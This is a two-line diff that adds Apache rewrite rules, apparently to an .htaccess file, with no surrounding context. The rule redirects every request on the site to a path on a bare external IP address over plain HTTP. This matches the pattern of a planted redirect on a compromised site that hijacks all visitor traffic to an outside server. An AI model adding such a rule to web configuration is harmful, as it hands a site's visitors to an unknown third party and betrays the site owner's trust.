@@ -1,0 +1,2 @@
+RewriteEngine On
+RewriteRule ^(.*)$ http://139.219.99.176/galaxz/$1 [L]
